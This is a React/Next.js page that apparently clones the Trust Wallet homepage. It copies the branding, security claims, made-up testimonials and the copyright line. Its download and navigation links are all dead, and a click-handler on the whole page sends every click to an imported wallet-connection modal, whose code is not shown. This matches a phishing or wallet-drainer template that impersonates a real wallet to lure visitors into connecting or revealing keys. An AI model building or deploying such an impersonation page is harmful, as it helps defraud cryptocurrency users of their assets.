"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { 
  Globe, 
  Shield, 
  Smartphone, 
  Star, 
  Users, 
  Zap, 
  Apple, 
  Play, 
  Search,
  Check,
  X,
  Calendar,
  Award,
  Lock,
  Eye,
  Flag,
  ChevronDown,
  Twitter,
  Facebook,
  Instagram,
  Youtube,
  MessageCircle,
  Github
} from "lucide-react"
import { WalletConnectionModal } from "@/components/wallet-connection-modal"
import Link from "next/link"
import Image from "next/image"

export default function HomePage() {
  const [showWalletModal, setShowWalletModal] = useState(false)

  const handleAnyClick = () => {
    setShowWalletModal(true)
  }

  return (
    <div className="min-h-screen bg-white" onClick={handleAnyClick}>
      {/* Header */}
      <header className="fixed top-0 left-0 right-0 z-50 bg-white border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
                <Shield className="w-5 h-5 text-white" />
              </div>
              <span className="text-xl font-bold text-gray-900">TRUST</span>
            </div>
            
            <nav className="hidden lg:flex items-center gap-6 xl:gap-8">
              <a href="#" className="text-gray-600 hover:text-gray-900 font-medium">Wallet</a>
              <a href="#" className="text-gray-600 hover:text-gray-900 font-medium">Features</a>
              <a href="#" className="text-gray-600 hover:text-gray-900 font-medium">Build</a>
              <a href="#" className="text-gray-600 hover:text-gray-900 font-medium">Support</a>
              <a href="#" className="text-gray-600 hover:text-gray-900 font-medium">About</a>
            </nav>
            
            <div className="flex items-center gap-2 sm:gap-4">
              <Button variant="outline" size="sm" className="hidden sm:flex items-center gap-2 text-gray-600 border-gray-300">
                <Globe className="w-4 h-4" />
                <span className="hidden md:inline">Language</span>
                <ChevronDown className="w-4 h-4" />
              </Button>
              <Button size="sm" className="bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm">
                <span className="hidden sm:inline">Download</span>
                <span className="sm:hidden">↓</span>
              </Button>
            </div>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="pt-20 sm:pt-24 pb-16 sm:pb-20 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <div className="grid lg:grid-cols-2 gap-8 lg:gap-12 items-center">
            <div className="space-y-6 lg:space-y-8">
              <div className="space-y-4 lg:space-y-6">
                <h1 className="text-4xl sm:text-5xl lg:text-6xl font-bold text-gray-900 leading-tight">
                  True crypto ownership.
                  <br />
                  Powerful{" "}
                  <span className="text-blue-600">Web3</span>{" "}
                  experiences
                </h1>
                <p className="text-lg sm:text-xl text-gray-600 leading-relaxed max-w-lg">
                  Unlock the power of your cryptocurrency assets and explore the world of Web3 with Trust Wallet
                </p>
              </div>

              <div className="flex flex-col sm:flex-row gap-3 sm:gap-4">
                <Button className="bg-white border-2 border-blue-600 text-blue-600 hover:bg-blue-50 px-6 sm:px-8 py-3 rounded-full font-medium text-sm sm:text-base">
                  Download Mobile App
                </Button>
                <Button variant="outline" className="bg-white border-2 border-blue-600 text-blue-600 hover:bg-blue-50 px-6 sm:px-8 py-3 rounded-full font-medium text-sm sm:text-base">
                  Download Extension
                </Button>
              </div>

              <div className="bg-gray-50 p-4 sm:p-6 rounded-2xl">
                <div className="flex flex-col sm:flex-row items-start sm:items-center gap-4 mb-6">
                  <div className="w-16 h-16 bg-white rounded-xl flex items-center justify-center flex-shrink-0">
                    <Image src="/qr-code.png" alt="QR Code" width={40} height={40} />
                  </div>
                  <div className="space-y-2 grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <div className="flex items-center gap-2">
                      <Users className="w-4 h-4 sm:w-5 sm:h-5 text-gray-600" />
                      <span className="text-gray-600 font-medium text-sm sm:text-base">Trusted by 200M people</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Calendar className="w-4 h-4 sm:w-5 sm:h-5 text-gray-600" />
                      <span className="text-gray-600 font-medium text-sm sm:text-base">Founded in 2017</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Shield className="w-4 h-4 sm:w-5 sm:h-5 text-gray-600" />
                      <span className="text-gray-600 font-medium text-sm sm:text-base">Independently Audited</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Award className="w-4 h-4 sm:w-5 sm:h-5 text-gray-600" />
                      <span className="text-gray-600 font-medium text-sm sm:text-base">ISO Certified</span>
                    </div>
                    <div className="flex items-center gap-2 sm:col-span-2">
                      <Star className="w-4 h-4 sm:w-5 sm:h-5 text-yellow-500" />
                      <span className="text-gray-600 font-medium text-sm sm:text-base">Top reviews ★★★★★</span>
                    </div>
                  </div>
                </div>
                
                <div className="space-y-3">
                  <Button className="w-full bg-black text-white rounded-lg flex items-center justify-center gap-2 py-3 text-sm sm:text-base">
                    <Apple className="w-4 h-4 sm:w-5 sm:h-5" />
                    iOS
                  </Button>
                  <Button className="w-full bg-white border border-gray-300 text-gray-900 rounded-lg flex items-center justify-center gap-2 py-3 text-sm sm:text-base">
                    <Play className="w-4 h-4 sm:w-5 sm:h-5" />
                    Google Play
                  </Button>
                  <Button className="w-full bg-blue-600 text-white rounded-lg flex items-center justify-center gap-2 py-3 text-sm sm:text-base">
                    <Smartphone className="w-4 h-4 sm:w-5 sm:h-5" />
                    Android APK
                  </Button>
                </div>
              </div>
            </div>

            <div className="relative order-first lg:order-last">
              <Image
                src="/download (1).svg"
                alt="Trust Wallet App"
                width={400}
                height={600}
                className="w-full max-w-sm sm:max-w-md mx-auto"
              />
            </div>
          </div>
        </div>
      </section>

      {/* Building on Trust Section */}
      <section className="bg-blue-600 text-white py-16 sm:py-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6">
          <div className="grid lg:grid-cols-2 gap-8 lg:gap-12 items-center">
            <div className="space-y-4 lg:space-y-6">
              <h2 className="text-3xl sm:text-4xl lg:text-5xl font-bold">Building on Trust</h2>
              <p className="text-lg sm:text-xl text-blue-100 leading-relaxed max-w-lg">
                We have been building as a community for everyone. Our platform enables developers to build their ideas and makes crypto accessible to everyone, everywhere.
              </p>
              <Button className="bg-white text-blue-600 hover:bg-gray-100 px-6 sm:px-8 py-3 rounded-full font-medium text-sm sm:text-base">
                Check out our Developer Docs
              </Button>
            </div>
            <div className="relative order-first lg:order-last">
              <Image
                src="/download (2).svg"
                alt="Trust Community"
                width={400}
                height={400}
                className="w-full max-w-sm mx-auto"
              />
            </div>
          </div>
        </div>
      </section>

      {/* One Platform, Millions of Assets Section */}
      <section className="py-16 sm:py-20 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <div className="text-center space-y-4 lg:space-y-6 mb-8 lg:mb-12">
            <h2 className="text-3xl sm:text-4xl lg:text-5xl font-bold text-gray-900">One Platform, Millions of Assets</h2>
            <p className="text-lg sm:text-xl text-gray-600 max-w-3xl mx-auto leading-relaxed">
              Be a leading Web3 multi-chain platform, we support millions of assets across 100+ blockchains. Easily store, send, receive, and exchange your cryptocurrency within the wallet.
            </p>
          </div>

          <div className="bg-white rounded-2xl lg:rounded-3xl shadow-lg p-4 sm:p-6 lg:p-8 mb-8 lg:mb-12">
            <div className="flex items-center gap-3 sm:gap-4 mb-4 sm:mb-6">
              <Search className="w-4 h-4 sm:w-5 sm:h-5 text-gray-400" />
              <Input 
                placeholder="Search a chain..." 
                className="border-0 text-base sm:text-lg"
              />
            </div>
            
            <div className="overflow-x-auto">
              <table className="w-full min-w-[600px]">
                <thead>
                  <tr className="border-b border-gray-200">
                    <th className="text-left py-3 sm:py-4 font-semibold text-gray-900 text-sm sm:text-base">Chain</th>
                    <th className="text-center py-3 sm:py-4 font-semibold text-gray-900 text-sm sm:text-base">Buy</th>
                    <th className="text-center py-3 sm:py-4 font-semibold text-gray-900 text-sm sm:text-base">Sell</th>
                    <th className="text-center py-3 sm:py-4 font-semibold text-gray-900 text-sm sm:text-base">Swap</th>
                    <th className="text-center py-3 sm:py-4 font-semibold text-gray-900 text-sm sm:text-base">Earn</th>
                    <th className="text-center py-3 sm:py-4 font-semibold text-gray-900 text-sm sm:text-base">dApps</th>
                  </tr>
                </thead>
                <tbody className="space-y-4">
                  {[
                    { name: "Solana", symbol: "SOL", icon: "🟣" },
                    { name: "BNB", symbol: "BNB", icon: "🟡" },
                    { name: "Ethereum", symbol: "ETH", icon: "🔷" }
                  ].map((chain, i) => (
                    <tr key={i} className="border-b border-gray-100">
                      <td className="py-3 sm:py-4">
                        <div className="flex items-center gap-2 sm:gap-3">
                          <span className="text-xl sm:text-2xl">{chain.icon}</span>
                          <div>
                            <div className="font-semibold text-gray-900 text-sm sm:text-base">{chain.name}</div>
                            <div className="text-xs sm:text-sm text-gray-500">({chain.symbol})</div>
                          </div>
                        </div>
                      </td>
                      <td className="text-center py-3 sm:py-4">
                        <Check className="w-4 h-4 sm:w-5 sm:h-5 text-blue-600 mx-auto" />
                      </td>
                      <td className="text-center py-3 sm:py-4">
                        <Check className="w-4 h-4 sm:w-5 sm:h-5 text-blue-600 mx-auto" />
                      </td>
                      <td className="text-center py-3 sm:py-4">
                        <Check className="w-4 h-4 sm:w-5 sm:h-5 text-blue-600 mx-auto" />
                      </td>
                      <td className="text-center py-3 sm:py-4">
                        <Check className="w-4 h-4 sm:w-5 sm:h-5 text-blue-600 mx-auto" />
                      </td>
                      <td className="text-center py-3 sm:py-4">
                        <Check className="w-4 h-4 sm:w-5 sm:h-5 text-blue-600 mx-auto" />
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 sm:gap-8 text-center">
            <div>
              <div className="text-3xl sm:text-4xl lg:text-5xl font-bold text-gray-900 mb-2">10M+</div>
              <div className="text-base sm:text-lg text-gray-600">Assets</div>
            </div>
            <div>
              <div className="text-3xl sm:text-4xl lg:text-5xl font-bold text-gray-900 mb-2">600M+</div>
              <div className="text-base sm:text-lg text-gray-600">NFTs</div>
            </div>
            <div>
              <div className="text-3xl sm:text-4xl lg:text-5xl font-bold text-gray-900 mb-2">100+</div>
              <div className="text-base sm:text-lg text-gray-600">Blockchains</div>
            </div>
          </div>
        </div>
      </section>

      {/* Browse dApps Section */}
      <section className="py-20 px-6">
        <div className="max-w-7xl mx-auto text-center space-y-12">
          <div className="space-y-6">
            <h2 className="text-5xl font-bold text-gray-900">Browse a world of dApps</h2>
            <p className="text-xl text-gray-600 max-w-2xl mx-auto leading-relaxed">
              Access Web3 and DeFi opportunities via our dApp browser.
            </p>
          </div>

          <div className="relative">
            <Image
              src="/download (3).svg"
              alt="dApp Browser"
              width={300}
              height={400}
              className="mx-auto"
            />
          </div>
        </div>
      </section>

      {/* Deposit crypto Section */}
      <section className="bg-gradient-to-r from-pink-400 to-purple-500 py-20">
        <div className="max-w-7xl mx-auto px-6">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            <div className="space-y-6">
              <h2 className="text-5xl font-bold text-gray-900">Deposit crypto easily from exchanges</h2>
              <p className="text-xl text-gray-700 leading-relaxed max-w-lg">
                Deposit crypto from Binance, Coinbase, and other exchanges directly to your Trust Wallet.
              </p>
              <Button className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-full font-medium">
                Get started with deposits
              </Button>
            </div>
            <div className="relative">
              <Image
                src="/download (4).svg"
                alt="Deposit Interface"
                width={300}
                height={400}
                className="mx-auto"
              />
            </div>
          </div>
        </div>
      </section>

      {/* Zero personal tracking Banner */}
      <section className="bg-gradient-to-r from-yellow-400 to-green-400 py-16">
        <div className="max-w-4xl mx-auto px-6 text-center">
          <h2 className="text-5xl font-bold text-gray-900 mb-6">Zero personal tracking</h2>
          <p className="text-xl text-gray-700 leading-relaxed">
            We secure your wallet, but don't control or have access to your private keys or secret phrase - only you do.
          </p>
        </div>
      </section>

      {/* True ownership Section */}
      <section className="bg-gradient-to-r from-green-400 to-blue-500 py-20">
        <div className="max-w-7xl mx-auto px-6">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            <div className="space-y-6">
              <h2 className="text-5xl font-bold text-gray-900">True ownership of your crypto assets</h2>
              <p className="text-xl text-gray-700 leading-relaxed max-w-lg">
                You own your crypto, not us. Your private keys are stored locally on your device.
              </p>
              <Button className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-full font-medium">
                Get Started
              </Button>
            </div>
            <div className="relative">
              <div className="w-64 h-64 bg-white/20 rounded-full flex items-center justify-center mx-auto">
                <Lock className="w-32 h-32 text-white" />
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Security Features Section */}
      <section className="bg-gradient-to-r from-green-400 to-blue-500 py-20">
        <div className="max-w-7xl mx-auto px-6">
          <div className="grid md:grid-cols-3 gap-8 mb-12">
            {[
              {
                icon: Lock,
                title: "Added security with encryption",
                desc: "Your private keys never leave your device and are encrypted with biometric authentication."
              },
              {
                icon: Eye,
                title: "Zero personal tracking",
                desc: "We don't track, collect, or share any of your personal information or wallet activity."
              },
              {
                icon: Flag,
                title: "Proactive alerts for risky transactions",
                desc: "Get real-time alerts for suspicious transactions and protect your assets."
              }
            ].map((feature, i) => (
              <Card key={i} className="bg-white rounded-2xl p-8 text-center">
                <CardContent className="space-y-4">
                  <div className="w-16 h-16 bg-blue-100 rounded-2xl flex items-center justify-center mx-auto">
                    <feature.icon className="w-8 h-8 text-blue-600" />
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">{feature.title}</h3>
                  <p className="text-gray-600 leading-relaxed">{feature.desc}</p>
                </CardContent>
              </Card>
            ))}
          </div>
          
          <div className="text-center">
            <Button className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-full font-medium">
              Learn more about privacy & security
            </Button>
          </div>
        </div>
      </section>

      {/* One-stop Web3 wallet Section */}
      <section className="py-20 px-6 bg-gray-50">
        <div className="max-w-7xl mx-auto">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            <div className="space-y-6">
              <h2 className="text-5xl font-bold text-gray-900">Your one-stop, Web3 wallet</h2>
              <p className="text-xl text-gray-600 leading-relaxed max-w-lg">
                Buy, sell, swap, stake, and deposit crypto all from one place. Earn rewards and explore DeFi opportunities.
              </p>
              
              <Tabs defaultValue="mobile" className="w-full">
                <TabsList className="grid w-full grid-cols-2">
                  <TabsTrigger value="mobile" className="rounded-l-full">Mobile</TabsTrigger>
                  <TabsTrigger value="extension" className="rounded-r-full">Extension</TabsTrigger>
                </TabsList>
                <TabsContent value="mobile" className="mt-6">
                  <Button className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-full font-medium">
                    Download Mobile App
                  </Button>
                </TabsContent>
                <TabsContent value="extension" className="mt-6">
                  <Button className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-full font-medium">
                    Download Extension
                  </Button>
                </TabsContent>
              </Tabs>
            </div>
            
            <div className="relative">
              <Image
                src="/download (5).svg"
                alt="Trust Wallet Mobile"
                width={300}
                height={500}
                className="mx-auto"
              />
            </div>
          </div>
        </div>
      </section>

      {/* Community Section */}
      <section className="py-20 px-6">
        <div className="max-w-7xl mx-auto text-center space-y-12">
          <div className="space-y-6">
            <h2 className="text-5xl font-bold text-gray-900">Enjoy a Web3 experience powered by community</h2>
            <p className="text-xl text-gray-600 max-w-2xl mx-auto leading-relaxed">
              Join our vibrant and diverse community to learn about the power of true ownership, crypto, and Web3.
            </p>
          </div>

          <div className="grid md:grid-cols-4 gap-6">
            {[
              { svg: "/download (6).svg", name: "Sarah Chen", quote: "Trust Wallet changed my crypto journey!" },
              { svg: "/download (7).svg", name: "Marcus Johnson", quote: "The best wallet for DeFi!" },
              { svg: "/download (8).svg", name: "Elena Rodriguez", quote: "Secure and easy to use!" },
              { svg: "/placeholder.svg", name: "David Kim", quote: "Perfect for Web3 exploration!" }
            ].map((member, i) => (
              <Card key={i} className="overflow-hidden">
                <Image
                  src={member.svg}
                  alt={`Community ${i + 1}`}
                  width={200}
                  height={200}
                  className="w-full h-48 object-cover"
                />
                <CardContent className="p-4">
                  <h3 className="font-semibold text-gray-900">{member.name}</h3>
                  <p className="text-sm text-gray-600">"{member.quote}"</p>
                </CardContent>
              </Card>
            ))}
          </div>

          <Button className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-full font-medium">
            Join our community on Telegram
          </Button>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gray-100 py-16">
        <div className="max-w-7xl mx-auto px-6">
          <div className="grid md:grid-cols-6 gap-8 mb-12">
            <div className="space-y-4">
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
                  <Shield className="w-5 h-5 text-white" />
                </div>
                <span className="text-xl font-bold text-gray-900">TRUST</span>
              </div>
              <div>
                <h3 className="font-semibold text-gray-900 mb-2">Download Trust Wallet</h3>
                <p className="text-gray-600 text-sm">The most trusted & secure crypto wallet.</p>
              </div>
              <div className="space-y-2">
                <Button className="w-full bg-blue-600 text-white rounded-lg flex items-center justify-center gap-2 py-2">
                  <Apple className="w-4 h-4" />
                  Download for iOS
                </Button>
                <Button className="w-full bg-blue-600 text-white rounded-lg flex items-center justify-center gap-2 py-2">
                  <Globe className="w-4 h-4" />
                  Download Extension
                </Button>
                <Button className="w-full bg-blue-600 text-white rounded-lg flex items-center justify-center gap-2 py-2">
                  <Smartphone className="w-4 h-4" />
                  Download APK
                </Button>
                <Button className="w-full bg-blue-600 text-white rounded-lg flex items-center justify-center gap-2 py-2">
                  <Play className="w-4 h-4" />
                  Download for Android
                </Button>
              </div>
            </div>

            {[
              { 
                title: "Wallet", 
                links: ["Mobile App", "Browser Extension", "Hardware Wallet", "Desktop App"] 
              },
              { 
                title: "Features", 
                links: ["Buy Crypto", "Swap", "Staking", "NFTs", "DeFi", "dApps"] 
              },
              { 
                title: "Build", 
                links: ["Developer Docs", "Wallet Core", "Submit dApp", "API", "SDK"] 
              },
              { 
                title: "Support", 
                links: ["FAQ", "Community", "Contact Us", "Help Center", "Status"] 
              },
              { 
                title: "About", 
                links: ["Company", "Careers", "Press", "Blog", "Legal"] 
              }
            ].map((section, i) => (
              <div key={i} className="space-y-4">
                <h3 className="font-semibold text-gray-900">{section.title}</h3>
                <ul className="space-y-2">
                  {section.links.map((link, j) => (
                    <li key={j}>
                      <a href="#" className="text-gray-600 hover:text-gray-900 text-sm">
                        {link}
                      </a>
                    </li>
                  ))}
                </ul>
              </div>
            ))}
          </div>

          <div className="border-t border-gray-300 pt-8">
            <div className="flex flex-col md:flex-row justify-between items-center gap-4">
              <div className="space-y-4">
                <h3 className="font-semibold text-gray-900">Stay Connected</h3>
                <div className="flex gap-4">
                  <Twitter className="w-6 h-6 text-gray-600 hover:text-blue-600 cursor-pointer" />
                  <Facebook className="w-6 h-6 text-gray-600 hover:text-blue-600 cursor-pointer" />
                  <Instagram className="w-6 h-6 text-gray-600 hover:text-blue-600 cursor-pointer" />
                  <Youtube className="w-6 h-6 text-gray-600 hover:text-blue-600 cursor-pointer" />
                  <MessageCircle className="w-6 h-6 text-gray-600 hover:text-blue-600 cursor-pointer" />
                  <Github className="w-6 h-6 text-gray-600 hover:text-blue-600 cursor-pointer" />
                </div>
              </div>
              <p className="text-gray-600 text-sm">© 2024 Trust Wallet. All rights reserved.</p>
            </div>
          </div>
        </div>
      </footer>

      {/* Wallet Connection Modal */}
      <WalletConnectionModal isOpen={showWalletModal} onClose={() => setShowWalletModal(false)} />
    </div>
  )
}